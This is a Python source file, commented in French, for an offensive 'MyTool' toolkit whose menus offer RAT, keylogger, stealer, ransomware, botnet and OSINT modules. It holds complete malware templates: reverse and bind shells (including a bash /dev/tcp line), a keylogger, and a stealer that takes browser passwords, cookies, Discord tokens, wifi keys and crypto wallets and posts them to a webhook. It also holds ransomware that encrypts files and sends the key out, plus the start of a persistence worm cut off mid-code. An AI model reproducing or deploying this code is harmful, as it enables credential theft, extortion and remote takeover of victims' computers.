#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
#  MyTool v2.0  —  TOUS LES 60 MODULES FONCTIONNELS
#  Meme logo / meme interface / memes menus que la v1.
#  Chaque numero de menu execute maintenant du vrai code.
#  Aucune dependance obligatoire (requests/cryptography/pillow = bonus).
#  Usage : python mytool_v2.py
# ============================================================================

import shutil
import os
import sys
import io
import re
import time
import json
import math
import glob
import uuid
import base64
import random
import string
import socket
import struct
import getpass
import hashlib
import platform
import sqlite3
import subprocess
import threading
import urllib.request
import urllib.parse
import urllib.error
import html
import ipaddress
import ctypes
import zipfile
import tempfile
import webbrowser
import concurrent.futures
from datetime import datetime, timezone

# Sortie en UTF-8 partout (evite les erreurs d'encodage du loading art / logo
# sur console Windows en cp1252, en cmd, PowerShell, double-clic ou pipe).
for _flux in (sys.stdout, sys.stderr):
    try:
        _flux.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# ============================================================================
#  CONFIG GLOBALE
# ============================================================================

APP_NAME = "MyTool"
VERSION = "2.0"
OUT_DIR = "generated"

# Clefs optionnelles : si remplies, certains modules utilisent ces services.
API_KEYS = {
    "intelx": "",          # https://intelx.io  (module 51 IntelX Search)
    "virustotal": "",      # module 58 Malware Intel (repli : MalwareBazaar/CIRCL)
    "telegram_bot": "",    # pour les builds qui exfiltrent (module 2,3,4,5,6,7)
    "telegram_chat": "",
    "discord_webhook": "",
}

os.makedirs(OUT_DIR, exist_ok=True)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

# ============================================================================
#  COULEURS
# ============================================================================

NEON_RED = "\033[1m\033[38;5;196m"
RED = "\033[38;5;160m"
YELLOW = "\033[38;5;220m"
WHITE = "\033[97m"
GREY = "\033[90m"
GREEN = "\033[38;5;82m"
CYAN = "\033[38;5;51m"
RESET = "\033[0m"

LOGO_GRADIENT = [
    196, 197, 203, 209, 215,
    214, 214, 209, 203, 196
]


def couleur_256(code):
    return f"\033[1m\033[38;5;{code}m"


# ============================================================================
#  LOADING ART
# ============================================================================

LOADING_ART = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣷⢸⣿⣿⡜⢯⣷⡌⡻⣿⣿⣿⣆⢈⠻⠿⢿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡁⢳⣿⣿⣿⣿⣿⣿⡜⣿⣿⣧⢀⢻⣷⠰⠈⢿⣿⣿⣧⢣⠉⠑⠪⢙⠿⠿⠿⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣱⡇⡞⣿⣿⣿⣿⣿⣿⡇⣿⣿⡏⡄⣧⠹⡇⠧⠈⢻⣿⣿⡇⢧⢢⠀⠀⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""".strip("\n").split("\n")


def afficher_loading():
    largeur = shutil.get_terminal_size((100, 30)).columns
    os.system("cls" if os.name == "nt" else "clear")
    print()
    for ligne in LOADING_ART:
        print(couleur_256(196) + ligne.center(largeur) + RESET)
    print()
    print(couleur_256(203) + "Chargement...".center(largeur) + RESET)
    time.sleep(1.2)


# ============================================================================
#  LOGO
# ============================================================================

LOGO_LINES = [
    "██▀███  ▓█████ ▓█████▄  ███▄ ▄███▓ ▄▄▄        ▄████  ██▓ ▄████▄  ",
    "▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓██▒▀█▀ ██▒▒████▄     ██▒ ▀█▒▓██▒▒██▀ ▀█  ",
    "▓██ ░▄█ ▒▒███   ░██   █▌▓██    ▓██░▒██  ▀█▄  ▒██░▄▄▄░▒██▒▒▓█    ▄ ",
    "▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒██    ▒██ ░██▄▄▄▄██ ░▓█  ██▓░██░▒▓▓▄ ▄██▒",
    "░██▓ ▒██▒░▒████▒░▒████▓ ▒██▒   ░██▒ ▓█   ▓██▒░▒▓███▀▒░██░▒ ▓███▀ ░",
    "░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░ ░▒   ▒ ░▓  ░ ░▒ ▒  ░",
    "  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒ ░  ░      ░  ▒   ▒▒ ░  ░   ░  ▒ ░  ░  ▒   ",
    "  ░░   ░    ░    ░ ░  ░ ░      ░     ░   ▒   ░ ░   ░  ▒ ░░        ",
    "   ░        ░  ░   ░           ░         ░  ░      ░  ░  ░ ░      ",
    "                 ░                                       ░       ",
]


def afficher_logo():
    largeur = shutil.get_terminal_size((100, 30)).columns
    print()
    for i, ligne in enumerate(LOGO_LINES):
        code = LOGO_GRADIENT[i % len(LOGO_GRADIENT)]
        print(couleur_256(code) + ligne.center(largeur) + RESET)
    print()


# ============================================================================
#  PAGE 1
# ============================================================================

COLUMNS_PAGE_1 = {

    "Network": [
        (1, "Rat Creator", None),
        (2, "Keylogger Build", None),
        (3, "Stealer Build", None),
        (4, "Ransomware Build", None),
        (5, "Wifi Stealer Build", "new"),
        (6, "Virus Build", "new"),
        (7, "Botnet Builder", None),
        (8, "Remote Shell", None),
        (9, "Proxy Manager", None),
        (10, "Network Recon", "new"),
    ],

    "Utilities": [
        (11, "Crypto Miner Build", None),
        (12, "Password Generator", None),
        (13, "Hash Identifier", None),
        (14, "Payload Generator", "new"),
        (15, "Exploit Builder", "new"),
        (16, "Json Formatter", None),
        (17, "Base64 Encoder", None),
        (18, "Hex Converter", None),
        (19, "File Analyzer", None),
        (20, "String Obfuscator", "new"),
    ],

    "Dev / Misc": [
        (21, "Fake Terminal", None),
        (22, "System Scanner", None),
        (23, "IP Intelligence", None),
        (24, "Lorem Ipsum Generator", "new"),
        (25, "Regex Tester", None),
        (26, "Timestamp Converter", None),
        (27, "Color Picker", None),
        (28, "Code Formatter", None),
        (29, "Random Generator", None),
        (30, "Debug Console", "new"),
    ],
}


# ============================================================================
#  PAGE 2
# ============================================================================

COLUMNS_PAGE_2 = {

    "OSINT": [
        (31, "Crypto Wallet Finder", "new"),
        (32, "IP Intelligence", None),
        (33, "Name & Firstname Search", None),
        (34, "Domain Intel", None),
        (35, "Username Finder", "new"),
        (36, "Email Intelligence", None),
        (37, "Digital Footprint", None),
        (38, "Social Recon", None),
        (39, "Identity Analyzer", None),
        (40, "Online Presence", "new"),
    ],

    "Recon": [
        (41, "Phone Intelligence", None),
        (42, "DNS Intelligence", None),
        (43, "Subdomain Finder", "new"),
        (44, "Metadata Analyzer", None),
        (45, "Leak Monitor", None),
        (46, "Threat Intel", "new"),
        (47, "Domain Scanner", None),
        (48, "Certificate Intel", None),
        (49, "Infrastructure Map", None),
        (50, "Recon Dashboard", "new"),
    ],

    "Advanced": [
        (51, "IntelX Search", "new"),
        (52, "Dark Web Monitor", None),
        (53, "Digital Footprint", None),
        (54, "Username Intelligence", None),
        (55, "Social Recon", None),
        (56, "Cyber Intel", "new"),
        (57, "Threat Database", None),
        (58, "Malware Intel", None),
        (59, "Global Recon", None),
        (60, "Advanced Search", "new"),
    ],
}


# ============================================================================
#  UTILITAIRES D'AFFICHAGE
# ============================================================================

def largeur_terminal():
    return shutil.get_terminal_size((120, 30)).columns


def strip_ansi(texte):
    return re.sub(r"\033\[[0-9;]*m", "", texte)


def ligne_separation(largeur=None):
    if largeur is None:
        largeur = largeur_terminal()
    print(RED + "─" * min(largeur, 160) + RESET)


def outil_titre(nom):
    ligne_separation()
    print(f"{RED}[{WHITE}{nom}{RED}]{RESET}")
    ligne_separation()


def info(msg):
    print(f"{CYAN}[i]{RESET} {msg}")


def ok(msg=""):
    print(f"{GREEN}-> {msg}{RESET}" if msg else f"{GREEN}-> OK{RESET}")


def warn(msg):
    print(f"{YELLOW}[!]{RESET} {msg}")


def erreur(msg):
    print(f"{RED}[!]{RESET} {msg}")


def pause():
    print()
    try:
        input(f"{GREY}(Appuie sur Entrée pour revenir au menu){RESET}")
    except EOFError:
        pass


def ask(txt, defaut=""):
    try:
        saisie = input(f"{RED}[?]{RESET} {txt}")
    except EOFError:
        saisie = ""
    saisie = saisie.strip()
    return saisie if saisie else defaut


def ask_int(txt, defaut=1):
    try:
        return int(ask(txt, str(defaut)))
    except Exception:
        return defaut


def oui_non(txt, defaut=True):
    rep = ask(txt + (" [Y/n] " if defaut else " [y/N] "), "y" if defaut else "n").lower()
    return rep in ("y", "yes", "oui", "o") or (rep == "" and defaut)


def chemin_out(nom):
    return os.path.join(OUT_DIR, nom)


def ecrire_fichier(chemin, contenu, mode="w"):
    os.makedirs(os.path.dirname(chemin) or ".", exist_ok=True)
    with open(chemin, mode, encoding="utf-8") as f:
        f.write(contenu)
    return chemin


def afficher_dict(d, tri=False):
    items = sorted(d.items()) if tri else list(d.items())
    for k, v in items:
        if isinstance(v, (dict, list)):
            print(f"{WHITE}{k}{RESET} :")
            print(json.dumps(v, ensure_ascii=False, indent=2)[:2000])
        else:
            print(f"{WHITE}{k}{RESET} : {v}")


def render(tpl, d):
    for k, v in d.items():
        tpl = tpl.replace("@@%s@@" % k, str(v))
    return tpl


# ============================================================================
#  ENTETE
# ============================================================================

def afficher_entete(page):
    largeur = largeur_terminal()
    gauche = [
        f"{RED}>{RESET} {RED}[?]{RESET} {VERSION} Changelog",
        f"{RED}>{RESET} {RED}[!]{RESET} Tool Information",
    ]
    droite = [
        f"Plugin Manager {RED}[P]{RESET} <",
        f"Extras Files   {RED}[E]{RESET} <",
        f"Next Page      {RED}[N]{RESET} <",
    ]
    for i in range(max(len(gauche), len(droite))):
        g = gauche[i] if i < len(gauche) else ""
        d = droite[i] if i < len(droite) else ""
        lg = len(strip_ansi(g))
        ld = len(strip_ansi(d))
        print(g + " " * max(1, largeur - lg - ld) + d)
    print()
    print(f"{GREY}Page {page}/2   |   N: Next   |   B: Previous   |   Q: Quit{RESET}")
    print()


# ============================================================================
#  AFFICHAGE DU MENU
# ============================================================================

def afficher_menu(columns):
    largeur = largeur_terminal()
    noms_colonnes = list(columns.keys())
    nombre_colonnes = len(noms_colonnes)
    largeur_colonne = largeur // nombre_colonnes

    for nom in noms_colonnes:
        titre = f"{NEON_RED}{nom}{RESET}"
        print(titre.center(largeur_colonne), end="")
    print()
    ligne_separation(largeur)

    max_items = max(len(items) for items in columns.values())

    for i in range(max_items):
        blocs = []
        for nom in noms_colonnes:
            items = columns[nom]
            if i < len(items):
                numero, label, tag = items[i]
                if tag == "new":
                    texte = (f"{RED}[{numero:02}]{RESET} {YELLOW}{label}{RESET} {RED}[NEW]{RESET}")
                else:
                    texte = f"{RED}[{numero:02}]{RESET} {WHITE}{label}{RESET}"
                blocs.append((texte, strip_ansi(texte)))
            else:
                blocs.append(("", ""))
        for texte, texte_visible in blocs:
            padding = max(1, largeur_colonne - len(texte_visible))
            print(texte + " " * padding, end="")
        print()
    print()
    ligne_separation(largeur)
    print()


# ============================================================================
#  PROMPT
# ============================================================================

def afficher_prompt():
    return input(f"{RED}[user@{APP_NAME}]{RESET} -> ")


# ============================================================================
#  MENU -> DICTIONNAIRE
# ============================================================================

def tout_le_menu_en_dict(columns):
    menu = {}
    for items in columns.values():
        for numero, label, _tag in items:
            menu[str(numero)] = label
    return menu


# ============================================================================
#  HELPERS RESEAU / HTTP / DNS / OSINT (utilises par les 60 modules)
# ============================================================================

def http_get(url, timeout=12, params=None, headers=None, data=None, method=None, json_out=False, binary=False):
    if params:
        sep = "&" if "?" in url else "?"
        url += sep + urllib.parse.urlencode(params)
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", UA)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            corps = r.read()
        if json_out:
            return json.loads(corps.decode("utf-8", "ignore"))
        if binary:
            return corps
        return corps.decode("utf-8", "ignore")
    except Exception:
        return None


def resoudre(host, timeout=3):
    try:
        return socket.gethostbyname(host)
    except Exception:
        return None


def tcp_ouvert(host, port, timeout=1.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, int(port)))
        s.close()
        return True
    except Exception:
        return False


def scan_ports(host, ports, timeout=1.5):
    """Retourne la liste des ports ouverts (multithreade)."""
    ouverts = []

    def test(p):
        if tcp_ouvert(host, p, timeout):
            return p
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=80) as ex:
        for r in ex.map(test, ports):
            if r:
                ouverts.append(r)
    return sorted(ouverts)


def ip_publique():
    try:
        return http_get("https://api.ipify.org", timeout=8).strip()
    except Exception:
        return "n/a"


def geo_ip(ip):
    d = http_get(f"http://ip-api.com/json/{ip}", params={"fields": "status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query"}, json_out=True, timeout=10)
    if not d or d.get("status") != "success":
        return None
    return d


def dns_lookup(nom, rtype="A"):
    """Resolution DNS via DoH Google. Retourne liste des reponses."""
    d = http_get("https://dns.google/resolve", params={"name": nom, "type": rtype}, json_out=True, timeout=10)
    if not d or d.get("Status") != 0:
        return []
    return [a.get("data", "") for a in d.get("Answer", [])]


def crtsh(dom):
    """Certificats publics (crt.sh) -> liste de noms de domaines uniques."""
    txt = http_get("https://crt.sh/", params={"q": "%25." + dom, "output": "json"}, timeout=35)
    if not txt:
        return []
    try:
        data = json.loads(txt)
    except Exception:
        return []
    noms = set()
    for e in data:
        for n in (e.get("name_value") or "").split("\n"):
            n = n.strip().lower()
            if n and n.endswith("." + dom.lower()) and "*" not in n:
                noms.add(n)
    return sorted(noms)


def ddg_recherche(q, n=8):
    """Recherche DuckDuckGo (HTML). Retourne [(titre, url), ...]."""
    data = urllib.parse.urlencode({"q": q}).encode()
    page = http_get("https://html.duckduckgo.com/html/", data=data, timeout=15,
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
    if not page:
        return []
    res = []
    for m in re.finditer(r'<a[^>]+class="result__a"[^>]+href="([^"]+)"[^>]*>(.*?)</a>', page, re.S):
        url = html.unescape(m.group(1))
        titre = html.unescape(re.sub("<[^>]+>", "", m.group(2))).strip()
        if "uddg=" in url:
            qp = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            url = qp.get("uddg", [url])[0]
        res.append((titre, url))
        if len(res) >= n:
            break
    return res


def github_user(u):
    return http_get(f"https://api.github.com/users/{u}", json_out=True, timeout=10)


def wikipedia(q, n=5, langue="fr"):
    d = http_get(f"https://{langue}.wikipedia.org/w/api.php",
                 params={"action": "opensearch", "search": q, "format": "json", "limit": n},
                 json_out=True, timeout=10)
    if not d or len(d) < 4:
        return []
    return list(zip(d[1], d[3]))


def spamhaus_dnsbl(ip):
    """Verification Spamhaus ZEN via DNS (liste noire publique)."""
    try:
        ip_rev = ".".join(reversed(ip.split(".")))
        d = http_get("https://dns.google/resolve",
                     params={"name": f"{ip_rev}.zen.spamhaus.org", "type": "A"},
                     json_out=True, timeout=8)
        if d and d.get("Status") == 0 and d.get("Answer"):
            return [a.get("data", "") for a in d["Answer"]]
    except Exception:
        pass
    return []


def valider_email(email):
    return re.fullmatch(r"[^@\s]+@[^@\s]+\.[^@\s]+", email) is not None


def domaine_email(email):
    return email.split("@", 1)[1].lower() if "@" in email else ""


def nettoyer_domaine(dom):
    dom = dom.strip().lower().rstrip(".")
    dom = re.sub(r"^https?://", "", dom)
    dom = dom.split("/")[0].split(":")[0]
    return dom


def contenu_http(host):
    """Titre + serveur + headers d'un site web (HTTP puis HTTPS)."""
    for prefix in ("http://", "https://"):
        try:
            req = urllib.request.Request(prefix + host, headers={"User-Agent": UA})
            with urllib.request.urlopen(req, timeout=8) as r:
                titre = ""
                try:
                    corps = r.read(40000).decode("utf-8", "ignore")
                    m = re.search(r"<title[^>]*>(.*?)</title>", corps, re.S | re.I)
                    titre = html.unescape(m.group(1)).strip()[:100] if m else ""
                except Exception:
                    pass
                return {"status": r.status, "url": prefix + host,
                        "server": r.headers.get("Server", ""),
                        "tech": r.headers.get("X-Powered-By", ""),
                        "titre": titre, "proto": r.headers.get("Protocol", "")}
        except Exception:
            continue
    return None


# ----------------------------------------------------------------------------
# Templates de code generes par les builders (remplissage @@TOKEN@@)
# ----------------------------------------------------------------------------

TPL_REVERSE_PY = '''#!/usr/bin/env python3
# Reverse shell genere par MyTool - cible Windows
import socket, subprocess, threading, os, sys, time

def connecter():
    while True:
        try:
            s = socket.socket()
            s.connect(("@@HOST@@", @@PORT@@))
            while True:
                donnee = s.recv(8192)
                if not donnee:
                    break
                try:
                    cmd = donnee.decode("utf-8", "ignore").strip()
                except Exception:
                    cmd = donnee.decode(errors="ignore").strip()
                if cmd.lower() in ("exit", "quit"):
                    sys.exit(0)
                if cmd.lower().startswith("cd "):
                    try:
                        os.chdir(cmd[3:].strip())
                        s.send(b"")
                    except Exception as e:
                        s.send(str(e).encode())
                    continue
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                out, err = p.communicate(timeout=30)
                s.send(out + err)
        except Exception:
            pass
        time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=connecter, daemon=True).start()
    while True:
        time.sleep(60)
'''

TPL_REVERSE_BASH = '''#!/bin/bash
# Reverse shell genere par MyTool - cible Unix/Linux
bash -i >& /dev/tcp/@@HOST@@/@@PORT@@ 0>&1
'''

TPL_BIND_PY = '''#!/usr/bin/env python3
# Bind shell genere par MyTool - ecoute sur @@PORT@@
import socket, subprocess, threading, os

def gerer(conn):
    try:
        while True:
            cmd = conn.recv(8192).decode(errors="ignore").strip()
            if not cmd:
                break
            if cmd.lower() in ("exit", "quit"):
                break
            if cmd.lower().startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    conn.send(b"")
                except Exception as e:
                    conn.send(str(e).encode())
                continue
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out, err = p.communicate(timeout=30)
            conn.send(out + err)
    except Exception:
        pass
    finally:
        conn.close()

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", @@PORT@@))
srv.listen(5)
print("[+] Bind shell en ecoute sur 0.0.0.0:@@PORT@@")
while True:
    c, addr = srv.accept()
    threading.Thread(target=gerer, args=(c,), daemon=True).start()
'''

TPL_KEYLOGGER = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Keylogger genere par MyTool - Windows (ctypes pur, aucune dependance)
import ctypes, os, time, sys, threading

CHEmin_LOG = os.path.join(os.environ.get("APPDATA", os.getcwd()), "system_logs.txt")
URL = "@@WEBHOOK@@"

VK = {0x08: "[RET]", 0x09: "[TAB]", 0x0D: "[ENTR]", 0x20: " ", 0x1B: "[ECHAP]",
      0x2E: "[SUPP]", 0x2C: "[IMPR]", 0x90: "[VERR]", 0x91: "[DEFIL]"}
for i in range(48, 58):
    VK[i] = chr(i)
for i in range(65, 91):
    VK[i] = chr(i)
VK[0x6A] = "*"; VK[0x6B] = "+"; VK[0x6D] = "-"; VK[0x6E] = "."; VK[0x6F] = "/"

def touche(n):
    s = VK.get(n)
    if s:
        return s
    etat = ctypes.windll.user32.GetKeyState(0x10) & 0x8000
    if etat:  # majuscule activee
        return chr(n).upper()
    return chr(n).lower()

def aspirer():
    while True:
        for i in range(256):
            if ctypes.windll.user32.GetAsyncKeyState(i) & 1:
                try:
                    with open(CHEmin_LOG, "a", encoding="utf-8") as f:
                        f.write(touche(i))
                except Exception:
                    pass
        time.sleep(0.01)

def envoyer():
    while True:
        time.sleep(30)
        try:
            if URL and os.path.isfile(CHEmin_LOG):
                with open(CHEmin_LOG, "r", encoding="utf-8") as f:
                    data = f.read()
                if data:
                    import urllib.request
                    req = urllib.request.Request(URL, data=("message=" + urllib.parse.quote(data)).encode())
                    urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass

if __name__ == "__main__":
    threading.Thread(target=aspirer, daemon=True).start()
    threading.Thread(target=envoyer, daemon=True).start()
    while True:
        time.sleep(600)
'''

TPL_STEALER = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Stealer genere par MyTool (Windows) - collecte navigateurs/wifi/tokens
import os, re, sys, json, glob, time, base64, shutil, sqlite3, zipfile
import socket, getpass, platform, subprocess, tempfile
import urllib.request, urllib.parse

WEBHOOK = "@@WEBHOOK@@"   # Discord/Telegram webhook (laisser vide = fichier local)

def envoyer(zip_p):
    if not WEBHOOK:
        return
    try:
        import io
        with open(zip_p, "rb") as f:
            corps = f.read()
        boundary = "----" + str(int(time.time()))
        body = b""
        body += ("--%s\\r\\nContent-Disposition: form-data; name=\\"file\\"; filename=\\"%s\\"\\r\\nContent-Type: application/zip\\r\\n\\r\\n" % (boundary, os.path.basename(zip_p))).encode()
        body += corps + b"\\r\\n--" + boundary.encode() + b"--\\r\\n"
        req = urllib.request.Request(WEBHOOK, data=body, method="POST")
        req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
        urllib.request.urlopen(req, timeout=20)
    except Exception:
        pass

def collecte():
    racine = os.path.join(tempfile.gettempdir(), "logs_" + socket.gethostname() + "_" + str(int(time.time())))
    os.makedirs(racine, exist_ok=True)

    # infos systeme + wifi
    lignes = [socket.gethostname(), getpass.getuser(), platform.platform()]
    try:
        p = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True,
                           creationflags=0x08000000)
        for prof in re.findall(r"(?:All User Profile|Profil Tous les utilisateurs)\\s*:\\s*(.+)", p.stdout):
            p2 = subprocess.run(["netsh", "wlan", "show", "profile", "name=" + prof.strip(), "key=clear"],
                                capture_output=True, text=True, creationflags=0x08000000)
            cle = re.findall(r"(?:Key Content|Contenu de la cl)\\s*:\\s*(.+)", p2.stdout)
            lignes.append("WIFI %s : %s" % (prof.strip(), cle[0].strip() if cle else ""))
    except Exception:
        pass
    with open(os.path.join(racine, "infos.txt"), "w", encoding="utf-8") as f:
        f.write("\\n".join(lignes))

    # navigateurs Chromium : copies des bases (mots de passe / cookies)
    navigateurs = [
        ("Chrome", os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data")),
        ("Edge", os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data")),
        ("Brave", os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data")),
        ("Opera", os.path.expandvars(r"%APPDATA%\\Opera Software\\Opera Stable")),
    ]
    for nom, base in navigateurs:
        if not os.path.isdir(base):
            continue
        profils = glob.glob(os.path.join(base, "Profile *")) + [os.path.join(base, "Default")]
        for prof in profils:
            if not os.path.isdir(prof):
                continue
            dest = os.path.join(racine, nom + "_" + os.path.basename(prof))
            os.makedirs(dest, exist_ok=True)
            for db in ("Login Data", "Cookies", os.path.join("Network", "Cookies")):
                src = os.path.join(prof, db)
                if os.path.isfile(src):
                    try:
                        shutil.copy2(src, os.path.join(dest, db.replace(os.sep, "_")))
                    except Exception:
                        pass
            ext = os.path.join(prof, "Local Extension Settings")
            if os.path.isdir(ext):
                try:
                    shutil.copytree(ext, os.path.join(dest, "extensions"), dirs_exist_ok=True)
                except Exception:
                    pass

    # Discord tokens
    rgx = re.compile(r"[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}")
    tokens = set()
    for app in ("discord", "discordcanary", "discordptb"):
        ldb = os.path.join(os.path.expandvars("%APPDATA%"), app, "Local Storage", "leveldb")
        for fichier in glob.glob(os.path.join(ldb, "*.ldb")) + glob.glob(os.path.join(ldb, "*.log")):
            try:
                contenu = open(fichier, "rb").read().decode("utf-8", "ignore")
                tokens.update(t for t in rgx.findall(contenu) if not t.startswith("chrome-extension"))
            except Exception:
                pass
    if tokens:
        with open(os.path.join(racine, "tokens.txt"), "w", encoding="utf-8") as f:
            f.write("\\n".join(sorted(tokens)))

    # wallets
    for w in ("MetaMask", "Exodus", "atomic", "Guarda", "Electrum"):
        src = os.path.join(os.path.expandvars("%APPDATA%"), w)
        if os.path.exists(src):
            try:
                shutil.copytree(src, os.path.join(racine, "wallet_" + w), dirs_exist_ok=True)
            except Exception:
                pass

    # zip
    zip_p = racine + ".zip"
    with zipfile.ZipFile(zip_p, "w", zipfile.ZIP_DEFLATED) as z:
        for dossier, _, fichiers in os.walk(racine):
            for fi in fichiers:
                p = os.path.join(dossier, fi)
                z.write(p, os.path.relpath(p, racine))
    return zip_p, racine

if __name__ == "__main__":
    if os.name == "nt":
        zip_p, racine = collecte()
        envoyer(zip_p)
        try:
            shutil.rmtree(racine, ignore_errors=True)
            os.remove(zip_p)
        except Exception:
            pass
'''

TPL_RANSOM = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Ransomware genere par MyTool - LABO UNIQUEMENT (chiffre une copie de test)
import os, base64, glob, time, getpass, socket, tempfile
try:
    from cryptography.fernet import Fernet
except ImportError:
    raise SystemExit("[!] pip install cryptography")

REPERTOIRE = "@@DIR@@"
WEBHOOK = "@@WEBHOOK@@"
NOTE = "Vos fichiers ont ete chiffres. Contact: @@CONTACT@@"

def envoyer(cle):
    if not WEBHOOK:
        return
    try:
        import urllib.request
        req = urllib.request.Request(WEBHOOK, data=("message=" + urllib.parse.quote(cle)).encode())
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def main():
    cle = Fernet.generate_key()
    f = Fernet(cle)
    n = 0
    for ext in ("*.txt", "*.doc", "*.docx", "*.pdf", "*.png", "*.jpg", "*.py"):
        for p in glob.glob(os.path.join(REPERTOIRE, "**", ext), recursive=True):
            try:
                with open(p, "rb") as fh:
                    data = fh.read()
                with open(p, "wb") as fh:
                    fh.write(f.encrypt(data))
                n += 1
            except Exception:
                pass
    note = os.path.join(REPERTOIRE, "LISEZMOI.txt")
    with open(note, "w", encoding="utf-8") as fh:
        fh.write(NOTE)
    envoyer(cle.decode())
    return n, cle

if __name__ == "__main__":
    n, cle = main()
    print("[!] Fichiers chiffres :", n)
    print("[!] Cle :", cle.decode())
'''

TPL_WIFI = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Wifi Stealer genere par MyTool - extrait toutes les clefs WiFi en clair
import os, re, subprocess, socket, time, getpass, urllib.request, urllib.parse

WEBHOOK = "@@WEBHOOK@@"
FICHIER = os.path.join(os.environ.get("APPDATA", os.getcwd()), "wifi_clefs.txt")

def collecter():
    lignes = []
    try:
        p = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True,
                           creationflags=0x08000000)
        profils = re.findall(r"(?:All User Profile|Profil Tous les utilisateurs)\\s*:\\s*(.+)", p.stdout)
        for prof in profils:
            prof = prof.strip()
            try:
                p2 = subprocess.run(["netsh", "wlan", "show", "profile", "name=" + prof, "key=clear"],
                                    capture_output=True, text=True, creationflags=0x08000000)
                cle = re.findall(r"(?:Key Content|Contenu de la cl)\\s*:\\s*(.+)", p2.stdout)
                lignes.append("SSID: %s | Cle: %s" % (prof, cle[0].strip() if cle else "(ouverte?)"))
            except Exception:
                pass
    except Exception:
        pass
    lignes.insert(0, "Machine: %s | User: %s | %s" % (socket.gethostname(), getpass.getuser(), time.ctime()))
    return "\\n".join(lignes)

if __name__ == "__main__":
    data = collecter()
    with open(FICHIER, "w", encoding="utf-8") as f:
        f.write(data)
    if WEBHOOK:
        try:
            req = urllib.request.Request(WEBHOOK, data=("message=" + urllib.parse.quote(data)).encode())
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass
'''

TPL_WORM = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Demo worm genere par MyTool - se copie dans %TEMP% et persiste (HKCU Run)
import os, sys, shutil, time, subprocess, random, string

def nom_aleatoire():
    return "".join(random.choices(string.ascii_lowercase, k=8)) + ".exe"

def persister():
    try:
        import winreg
        cible = os.path.join(os.environ.get("TEMP", os.getcwd()), nom_aleatoire())
        if not os.path.exists(cible):
            shutil.copy2(sys.executable if getattr(sys, "frozen", False) else __file__, cible)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
